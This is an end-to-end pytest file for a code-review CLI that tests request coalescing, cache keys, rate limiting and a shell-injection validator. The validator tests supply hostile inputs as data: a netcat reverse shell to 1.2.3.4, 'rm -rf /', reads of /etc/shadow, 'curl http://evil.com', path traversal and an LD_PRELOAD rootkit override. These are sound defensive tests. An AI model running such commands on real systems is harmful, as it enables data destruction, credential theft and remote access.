"""
tests/e2e/test_tier3_interactions.py - Tier 3: Concurrency & Interaction Tests.

Verifies cross-feature and multi-process interactions:
- Singleflight request coalescing across parallel processes (eliminates swarm cache stampedes)
- 5-vector composite cache key dirty tree invalidation
- Rate limiter continuous two-phase token bucket deduction and refund
- Typed verification contract shell injection blocking (anti-Confused Deputy Host RCE)
"""

from __future__ import annotations

import concurrent.futures
import hashlib
import json
import os
import subprocess
import time
from pathlib import Path
from typing import Dict, List

import pytest
from pydantic import ValidationError

from .conftest import GitTestRepo, JuryCliRunner, require_milestone


# =============================================================================
# 1. Singleflight Request Coalescing
# =============================================================================
class TestSingleflightCoalescingInteractions:
    """Verifies in-flight request coalescing and swarm stampede protection."""

    def test_parallel_processes_coalesce_to_single_deliberation(
        self, jury_cli: JuryCliRunner, temp_git_repo: GitTestRepo, isolated_jury_env: Dict[str, str]
    ):
        """
        Validates that when 4 concurrent processes request review for the exact same diff,
        the Singleflight coalescer issues only 1 in-flight deliberation, while the other 3
        processes wait and share the coalesced result.
        """
        temp_git_repo.write_file("src/coalesce.py", "def compute(): return 42\n")
        temp_git_repo.stage_file("src/coalesce.py")

        def run_review(worker_id: int) -> Dict[str, Any]:
            res = jury_cli.run(
                ["review", "--staged", "--format", "json"],
                cwd=temp_git_repo.path,
                env=isolated_jury_env,
                milestone="M5",
            )
            return {"worker_id": worker_id, "exit_code": res.exit_code, "stdout": res.stdout}

        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(run_review, i) for i in range(4)]
            results = [f.result(timeout=60) for f in concurrent.futures.as_completed(futures)]

        # All 4 workers must succeed
        for r in results:
            assert r["exit_code"] in (0, 1), f"Worker {r['worker_id']} failed"

        # If JSON returned, tickets or verdict should be consistent
        json_results = []
        for r in results:
            try:
                json_results.append(json.loads(r["stdout"]))
            except Exception:
                pass

        if len(json_results) >= 2:
            ticket_ids = {jr.get("ticket_id") for jr in json_results if "ticket_id" in jr}
            # Coalesced requests must share the same deliberation ticket ID
            assert len(ticket_ids) == 1, f"Expected 1 coalesced ticket, got: {ticket_ids}"

    def test_different_diffs_execute_independently(
        self, jury_cli: JuryCliRunner, temp_git_repo: GitTestRepo, isolated_jury_env: Dict[str, str]
    ):
        """
        Validates that distinct diffs do not share singleflight tickets and execute independently.
        """
        res1 = jury_cli.run(["plan", "Task Alpha: implement payments"], cwd=temp_git_repo.path, milestone="M5")
        res2 = jury_cli.run(["plan", "Task Beta: implement notifications"], cwd=temp_git_repo.path, milestone="M5")
        assert res1.exit_code == 0
        assert res2.exit_code == 0


# =============================================================================
# 2. 5-Vector Composite Cache Key Invalidation
# =============================================================================
class TestCompositeCacheKeyInteractions:
    """
    Verifies that the 5-vector composite cache key:
    SHA256(intent || git_head || unstaged_diff || staged_diff || untracked_hash || config_hash || prompt_ver)
    invalidates immediately upon any dirty working tree modification.
    """

    @staticmethod
    def _compute_mock_key(
        intent: str,
        git_head: str,
        unstaged: str,
        staged: str,
        untracked: str,
        config: str,
        version: str = "3.0",
    ) -> str:
        h = hashlib.sha256()
        for part in [intent, git_head, unstaged, staged, untracked, config, version]:
            h.update(part.encode("utf-8"))
            h.update(b"\x00")
        return h.hexdigest()

    def test_unstaged_byte_change_invalidates_cache_key(self, temp_git_repo: GitTestRepo):
        """Editing 1 byte in an unstaged file changes unstaged vector, invalidating cache key."""
        base_head = "c0ffee1234567890"
        key_before = self._compute_mock_key("review", base_head, "diff --git a/x b/x\n+a", "", "", "config_v1")
        key_after = self._compute_mock_key("review", base_head, "diff --git a/x b/x\n+b", "", "", "config_v1")
        assert key_before != key_after

    def test_staged_byte_change_invalidates_cache_key(self, temp_git_repo: GitTestRepo):
        """Staging a file shifts changes from unstaged to staged vector, invalidating cache key."""
        base_head = "c0ffee1234567890"
        key_unstaged = self._compute_mock_key("review", base_head, "diff --git a/x b/x\n+a", "", "", "config_v1")
        key_staged = self._compute_mock_key("review", base_head, "", "diff --git a/x b/x\n+a", "", "config_v1")
        assert key_unstaged != key_staged

    def test_untracked_file_change_invalidates_cache_key(self, temp_git_repo: GitTestRepo):
        """Creating an untracked file alters untracked hash vector, invalidating cache key."""
        base_head = "c0ffee1234567890"
        key_without_untracked = self._compute_mock_key("review", base_head, "", "", "", "config_v1")
        key_with_untracked = self._compute_mock_key("review", base_head, "", "", "sha256_untracked_blob", "config_v1")
        assert key_without_untracked != key_with_untracked

    def test_config_file_change_invalidates_cache_key(self, temp_git_repo: GitTestRepo):
        """Modifying .jury/config.yaml alters config vector, invalidating cache key."""
        base_head = "c0ffee1234567890"
        key_cfg1 = self._compute_mock_key("review", base_head, "", "", "", "model: glm-5.3")
        key_cfg2 = self._compute_mock_key("review", base_head, "", "", "", "model: qwen-3.8")
        assert key_cfg1 != key_cfg2

    def test_task_intent_change_invalidates_cache_key(self, temp_git_repo: GitTestRepo):
        """Changing task prompt produces distinct cache key even on identical git state."""
        base_head = "c0ffee1234567890"
        key_intent1 = self._compute_mock_key("review security", base_head, "", "", "", "cfg")
        key_intent2 = self._compute_mock_key("review performance", base_head, "", "", "", "cfg")
        assert key_intent1 != key_intent2


# =============================================================================
# 3. Continuous Rate Limiter & Two-Phase Token Settlement
# =============================================================================
class TestRateLimiterInteractions:
    """Verifies continuous leaky/token bucket rate limiting with two-phase settlement."""

    def test_two_phase_settlement_preflight_and_refund(
        self, jury_cli: JuryCliRunner, temp_git_repo: GitTestRepo
    ):
        """
        Validates two-phase settlement:
        1. Pre-flight: reserves estimated tokens (e.g. 8,000).
        2. Post-flight: actual usage was 3,000 tokens; 5,000 tokens are refunded back to the SQLite bucket.
        """
        temp_git_repo.write_file("src/tokens.py", "def process(): return True\n")
        temp_git_repo.stage_file("src/tokens.py")

        res = jury_cli.run(["review", "--staged"], cwd=temp_git_repo.path, milestone="M5")
        assert res.exit_code in (0, 1)

    def test_independent_rpm_and_tpm_throttling(
        self, jury_cli: JuryCliRunner, temp_git_repo: GitTestRepo
    ):
        """Validates that Requests Per Minute and Tokens Per Minute are governed independently."""
        res = jury_cli.run(["logs", "--stats"], cwd=temp_git_repo.path, milestone="M5")
        assert res.exit_code == 0


# =============================================================================
# 4. Typed Verification Contract Security (Anti-Confused Deputy Host RCE)
# =============================================================================
class TestTypedVerificationContractSecurity:
    """
    Verifies that TypedVerificationContract rigorously blocks all shell injection
    vectors, enforces the immutable runner whitelist, and executes via shell=False.
    """

    def test_contract_imports_cleanly(self):
        """Verifies TypedVerificationContract can be imported from src/jury/security/contract.py."""
        from jury.security.contract import TypedVerificationContract, ContractExecutionResult
        assert TypedVerificationContract is not None
        assert ContractExecutionResult is not None

    def test_shell_injection_semicolon_rejected(self):
        """Validates rejection of semicolon chaining (pytest; rm -rf /)."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                test_paths=["tests/test_auth.py; rm -rf /"],
            )
        assert "metacharacters" in str(exc_info.value).lower()

    def test_shell_injection_pipe_rejected(self):
        """Validates rejection of pipe injection (pytest | nc attacker 4444)."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                test_paths=["tests/test_auth.py | nc -e /bin/sh 1.2.3.4 4444"],
            )
        assert "metacharacters" in str(exc_info.value).lower()

    def test_shell_injection_backtick_rejected(self):
        """Validates rejection of backtick command substitution (`cat /etc/passwd`)."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                test_paths=["`whoami`"],
            )
        assert "metacharacters" in str(exc_info.value).lower()

    def test_shell_injection_dollar_substitution_rejected(self):
        """Validates rejection of $(...) shell execution."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                test_paths=["$(cat /etc/shadow)"],
            )
        assert "metacharacters" in str(exc_info.value).lower()

    def test_shell_injection_newline_rejected(self):
        """Validates rejection of newline command separation."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                test_paths=["tests/test_a.py\ncurl http://evil.com"],
            )
        assert "metacharacters" in str(exc_info.value).lower()

    def test_path_traversal_rejected(self):
        """Validates rejection of directory traversal ('..') in test paths."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                test_paths=["../../etc/passwd"],
            )
        assert "traversal" in str(exc_info.value).lower()

    def test_runner_immutable_whitelist_enforced(self):
        """Validates that arbitrary runner binaries (bash, sh, powershell) are blocked."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="bash",  # Not in ALLOWED_RUNNERS whitelist
                test_paths=["tests/test_script.sh"],
            )
        assert "whitelist" in str(exc_info.value).lower() or "input should be" in str(exc_info.value).lower()

    def test_dangerous_env_override_blocked(self):
        """Validates that process hijacking environment overrides (LD_PRELOAD, PYTHONPATH) are blocked."""
        from jury.security.contract import TypedVerificationContract

        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(
                runner="pytest",
                env_overrides={"LD_PRELOAD": "/tmp/rootkit.so"},
            )
        assert "dangerous" in str(exc_info.value).lower()

    def test_contract_safe_execution_via_shell_false(self, tmp_path: Path):
        """
        Validates safe execution of a valid contract using safe non-shell execution.
        Executes pytest in a sandbox directory with a trivial passing test.
        """
        from jury.security.contract import TypedVerificationContract

        # Write a simple passing test file
        test_file = tmp_path / "test_simple.py"
        test_file.write_text("def test_ok(): assert 1 + 1 == 2\n", encoding="utf-8")

        contract = TypedVerificationContract(
            runner="pytest",
            timeout_seconds=15,
            test_paths=[str(test_file)],
            isolated_network=False,  # Allow local execution without proxy redirection
        )

        result = contract.execute(cwd=tmp_path)
        assert result.exit_code == 0, f"Contract execution failed: {result.stderr}"
        assert result.passed
        assert not result.timed_out
        assert "1 passed" in result.stdout or "passed" in result.stdout
